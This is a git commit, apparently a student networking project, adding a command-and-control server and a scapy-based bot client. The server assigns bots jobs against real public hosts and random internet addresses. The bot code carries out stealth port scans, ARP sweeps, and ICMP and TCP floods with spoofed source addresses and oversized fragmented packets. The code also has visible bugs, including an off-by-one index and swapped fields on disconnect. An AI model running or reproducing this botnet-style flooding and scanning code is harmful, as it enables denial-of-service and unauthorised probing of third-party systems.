73d625e68d62a2a9d46632130dde64dd19579553
tylerfriesen2 <tyler_2f@hotmail.com>
2020-12-16 16:55:18 -0500

    Final Project First Commit
    Added the traceroute function to the jobseeker and added a way for the jobcreator to keep track of the closest jobseeker to each ip in iplist

---
+++ Final Project/jobcreator.py
@@ -0,0 +1,193 @@
+import socket
+import threading
+import time
+import pickle
+import random
+import struct
+import math
+
+PORT = 6000
+SERVER = socket.gethostbyname(socket.gethostname())  # Get IP
+ADDR = (SERVER, PORT)
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creates server socket
+clients = []
+iplist = ["192.168.1.6", "www.google.ca", "docs.python.org", "www.minecraft.net", "cs.uwaterloo.ca"]
+traceinfo = [[True, math.inf, None], [True, math.inf, None], [True, math.inf, None], [True, math.inf, None], [True, math.inf, None]]
+subnets = ["192.168.1.1/24"]
+multijobqueue = [0, 0]
+threadList = []
+selectedThreads = []
+numOfBots = 0
+jobQueue = 0
+attackChoice = ""
+TCPTarget = ['', 0]
+ICMPTarget = ''
+
+# --- Shared Messages ---
+
+DISCONNECT = "disconnect"
+JOB_REQUEST = "jobrequest"
+JOB_REPORT = "jobreport"
+JOB_COMPLETE = "completed"
+JOB_INCOMPLETE = "incomplete"
+JOB_ASSIGNMENT = "assignment"
+JOB_SUCCESS = "success"
+JOB_FAILURE = "failure"
+COMPLETION_ACK = "goodjob"
+
+# --- Port Binding ---
+
+try:  # checks if port is being used
+    server.bind(ADDR)
+    print(f"Port :{PORT} bound successfully.")
+except:
+    print(f"Port :{PORT} is being used.")
+    quit()
+
+
+# --- Function Definitions ---
+
+def send(conn, addr, v):
+    print(f"\nSending the following message to client @ {addr}\n\t{v}\n")
+    m = pickle.dumps(v)
+    conn.send(m)
+
+
+def ifsuccess(conn, addr, v):  # Checks if incoming client is reporting job success
+    if v[1] == JOB_COMPLETE:  # Client reported success
+        print(f"Client @ {addr} has completed their task", end="")
+        if len(v) > 2:
+            print(f" with the following return value:\n\t\"{v[2]}\"")
+
+        if len(v) > 3:
+            if v[3] == 5:   # Check if the client is reporting from job 5
+                ip = v[4]
+                index = iplist.index(ip)
+                tracetime = v[5]
+                if traceinfo[index][1] > tracetime:
+                    traceinfo[index][2] = conn
+                    traceinfo[index][1] = tracetime
+                    print(f"\nClient @ {addr} is now the closest to host @ {ip} with a time of {tracetime} ms")
+                traceinfo[index][0] = v[6]
+                if v[6] is False:
+                    print(f"The host @ {ip} is unreachable.")
+
+        # Send completion acknowledgement
+        send(conn, addr, [COMPLETION_ACK])
+    elif v[1] == JOB_INCOMPLETE:
+        print(f"Client @ {addr} has not completed their task")
+        send(conn, addr, [COMPLETION_ACK])
+
+
+def hire(conn, addr, v):  # Give job to a client
+    job_num = random.randint(0, 5)  # int(input("Which job should the client do?: ")) - 1
+
+    if job_num == 0:    # Ping host
+        ip = random.choice(iplist)
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ip])
+    elif job_num == 1:  # Check port status
+        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+        port = random.randint(0, 65535)
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ip, port])
+    elif job_num == 2:  # ICMP Flood
+        global ICMPTarget
+        multijobqueue[0] += 1
+        if multijobqueue[0] == 1:
+            # ensures that all jobseeker recieve the same target
+            ICMPTarget = random.choice(iplist)
+        while multijobqueue[0] < 2:
+            time.sleep(0.5)
+        # Allows for other jobseekers to join
+        print(f"Waiting for more clients to connect.\n")
+        time.sleep(5)
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ICMPTarget])
+        multijobqueue[0] = 0
+    elif job_num == 3:  # TCP Flood
+        global TCPTarget
+        multijobqueue[1] += 1
+        if multijobqueue[1] == 1:
+            TCPTarget[0] = random.choice(iplist)
+            TCPTarget[1] = random.randint(0, 65535)
+        while multijobqueue[1] < 2:
+            time.sleep(0.5)
+        # Allows for other jobseekers to join
+        print(f"Waiting for more clients to connect.\n")
+        time.sleep(5)
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, TCPTarget[0], TCPTarget[1]])
+        multijobqueue[1] = 0
+    elif job_num == 4:      # Get live IP addresses
+        subnet = random.choice(subnets)
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, subnet])
+    elif job_num == 5:  # Trace route
+        reachable = False
+        target = ""
+        while not reachable:
+            target = random.randint(0, len(iplist))
+            reachable = traceinfo[target][0]
+
+        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, iplist[target]])
+    else:
+        print("That is not a valid job number.")
+        hire(conn, addr, v)
+
+
+def connect_client(conn, addr):
+    print(f"New connection established.")
+    connected = True
+    try:  # Check if client disconnected by not sending disconnect message
+        while connected:
+            m = conn.recv(2048)
+            v = pickle.loads(m)
+            print(f"Received the following message from the client @ {addr}:\n\t{v}\n")
+
+            if v[0] == DISCONNECT:  # Client requested disconnect
+                connected = False
+                print(f"Client @ {addr} has requested disconnect.")
+                handledisconnect(conn, addr)
+                print(f"\tDisconnected.")
+                print(f"{len(clients)} active connections.\n")
+
+            elif v[0] == JOB_REQUEST:  # Client requested job
+                print(f"Client @ {addr} is requesting a job")
+                hire(conn, addr, v)
+
+            elif v[0] == JOB_REPORT:  # Client is reporting job status
+                print(f"Client @ {addr} is reporting back")
+                ifsuccess(conn, addr, v)
+    except:
+        print(f"Client @ {addr} has disconnected on exception.")
+        handledisconnect(conn, addr)
+        print(f"{len(clients)} active connections.\n")
+
+
+def handledisconnect(conn, addr):
+    for x in traceinfo:
+        if x[1] == conn:
+            x[1] = None
+            x[2] = math.inf
+
+    conn.close()
+    clients.remove(addr)
+
+
+def start():
+    server.listen()  # Listen for incoming connections
+    print(f"Running on address {SERVER}:{PORT}")
+    while True:
+        conn, addr = server.accept()  # Server accepts the connection from the client
+        clients.append(addr)
+
+        # Create thread for each client, connect_client invoked by run() method
+        thread = threading.Thread(target=connect_client, args=(conn, addr))
+        thread.start()  # Start thread
+        print(f"\n{len(clients)} active connections.")
+
+
+# --- Start ---
+
+print("Starting...")
+for i in range(0):  # Just for fun
+    time.sleep(1)
+    print(".")
+print("Started.")
+start()
---
+++ Final Project/jobseeker.py
@@ -0,0 +1,235 @@
+import pickle
+import random
+import socket
+import sys
+import time
+import scapy
+import math
+from scapy.layers.inet import ICMP, IP, TCP, fragment, UDP
+from scapy.layers.l2 import ARP, Ether
+from scapy.sendrecv import sr1, srp
+from scapy.volatile import RandShort
+
+PORT = 6000
+SERVER = socket.gethostbyname(socket.gethostname())  # Get IP
+ADDR = (SERVER, PORT)
+conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create client socket
+conn.connect(ADDR)  # Connects socket to remote host
+print(f"Connected to server @ {ADDR}\n")
+val = "y"
+connected = True
+
+# --- Shared Messages ---
+
+DISCONNECT = "disconnect"
+JOB_REQUEST = "jobrequest"
+JOB_REPORT = "jobreport"
+JOB_COMPLETE = "completed"
+JOB_INCOMPLETE = "incomplete"
+JOB_ASSIGNMENT = "assignment"
+JOB_SUCCESS = "success"
+JOB_FAILURE = "failure"
+COMPLETION_ACK = "goodjob"
+
+
+# --- Function Definitions ---
+
+def send(v):  # Function to send messages to the server
+    # Pickle the message
+    msg = pickle.dumps(v)
+    conn.send(msg)
+
+    if v[0] == DISCONNECT:
+        print(f"Disconnecting from server @ {ADDR}")
+        connected = False
+    else:
+        print(f"Waiting for server @ {ADDR}\n")
+        msg = conn.recv(2048)
+        v = pickle.loads(msg)
+        if v[0] == JOB_ASSIGNMENT:
+            print(f"Received a job assignment from server @ {ADDR}")
+            if v[1] == 1:
+                job1(v)
+            elif v[1] == 2:
+                job2(v)
+            elif v[1] == 3:
+                job3(v)
+            elif v[1] == 4:
+                job4(v)
+            elif v[1] == 5:
+                job5(v)
+            elif v[1] == 6:
+                job6(v)
+        elif v[0] == COMPLETION_ACK:
+            print(f"Server @ {ADDR} acknowledged completion\n")
+
+
+# Ping a host
+def job1(v):
+    print(f"\nWorking on job 1 for @ {ADDR}")
+    print(v)
+    host = v[2]
+    print(f"\nPinging host @ {host}")
+    p = sr1(IP(dst=host, ttl=20) / ICMP(), timeout=2, verbose=0)
+
+    if p is None:
+        print(f"The host @ {host} is not online.\n")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
+    else:
+        print(f"The host @ {host} is online.\n")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
+
+
+# Check port status
+def job2(v):
+    print(f"\nWorking on job 2 for @ {ADDR}")
+    host = v[2]
+    port = v[3]
+    sport = RandShort()
+
+    print(f"Scanning {host}:{port} from :{sport}")
+    pkt = sr1(IP(dst=host) / TCP(sport=sport, dport=port, flags="FPU"), timeout=1, verbose=0)
+
+    if pkt is not None:
+        if pkt.haslayer(TCP):
+            if pkt[TCP].flags == 20:
+                send([JOB_REPORT, JOB_COMPLETE, "Closed"])
+            else:
+                print("port, TCP flag {pkt[TCP].flag|")
+        elif pkt.haslayer(ICMP):
+            send([JOB_REPORT, JOB_COMPLETE, "ICMP resp / filtered"])
+        else:
+            send([JOB_REPORT, JOB_COMPLETE, "Unknown resp"])
+    else:
+        send([JOB_REPORT, JOB_COMPLETE, "Open / filtered"])
+
+
+# ICMP Flood
+def job3(v):
+    print(f"ICMP attack commencing on {v[2]} for @ {ADDR}")
+    try:
+        ip_layer = IP(dst=v[2], src='192.168.2.1')
+        icmp_layer = ICMP()
+        pkt = ip_layer / icmp_layer
+        scapy.all.send(fragment(pkt / ("X"*60000)), count=3)
+        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
+    except:
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
+
+
+# TCP flood attack
+def job4(v):
+    target = v[2]
+    port = v[3]
+    print(f"Commencing TCP flood attack on {target} for @ {ADDR}")
+    try:
+        ipLayer = IP(dst=target, src="192.168.50.146")
+        icmpLayer = TCP(dport=port)
+        packet = ipLayer / icmpLayer
+
+        # receives no replies for sent packets, count = number of packets sent
+        scapy.all.send(fragment(packet / ("X" * 60000)), count=1)
+
+        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
+    except:
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
+
+
+# Get live IP addresses
+def job5(v):
+    print(f"Working on job 5 for @ {ADDR}")
+    subnet = v[2]
+    print("Target Subnet: " + subnet)
+    arp = ARP(pdst=subnet)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    req = ether / arp
+    res = srp(req, timeout=2, verbose=0)[0]
+    IPs = []
+    for sent, rec in res:
+        IPs.append(rec.psrc)
+    if not IPs:
+        print("No live IP Addresses")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
+    else:
+        print("Live IP Addresses: " + str(IPs))
+        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
+
+
+# Trace route
+def job6(v):
+    print(f"Working on job 6 for @ {ADDR}")
+    target = v[2]
+    print(f"\nTarget: {target}\n")
+    p = sr1(IP(dst=target, ttl=20) / ICMP(), timeout=2, verbose=0)
+    if p is None:
+        print(f"Destination host unreachable.\n")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE, 5, target, math.inf, False])
+        return
+
+    port = 33434
+    acctime = 0
+    found = False
+    attempts = 0
+
+    for i in range(1, 31):
+        print(f"{i:2}", end='')
+        times = []
+        reply = None
+        ip = ""
+        for j in range(3):
+            pkt = IP(dst=target, ttl=i) / UDP(dport=port)
+            sendtime = time.time()
+            reply = sr1(pkt, verbose=0, timeout=10)
+
+            if reply is None:
+                print(f"\t    *   ", end='')
+                times.append(math.inf)
+            else:
+                attempts = 0
+                ip = reply.src
+                elapsed = int(round((reply.time - sendtime) * 1000))
+                times.append(elapsed)
+
+                if elapsed >= 1:
+                    print(f"\t{elapsed:5} ms", end='')
+                else:
+                    print(f"\t <1 ms", end='')
+
+                if reply.type == 3:
+                    found = True
+
+        if reply is not None:
+            print(f"\t{ip:15}")
+
+            acctime += min(times)
+        else:
+            attempts += 1
+            print(f"\tRequest timed out.")
+
+        if attempts >= 3:
+            break
+
+        if found is True:
+            break
+
+    if found is True:
+        print(f"\nTrace complete.\nRoute time is {acctime} ms")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS, 5, target, acctime, True])
+        return
+    else:
+        print(f"\nRequest timed out.\n")
+        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE, 5, target, math.inf, True])
+        return
+
+
+# --- Start ---
+try:
+    while connected:
+        if random.randint(0, 25) == 0:
+            send([DISCONNECT])
+        else:
+            print(f"Sending job request to server @ {ADDR}")
+            send([JOB_REQUEST])
+    sys.exit(0)
+except:
+    sys.exit(1)
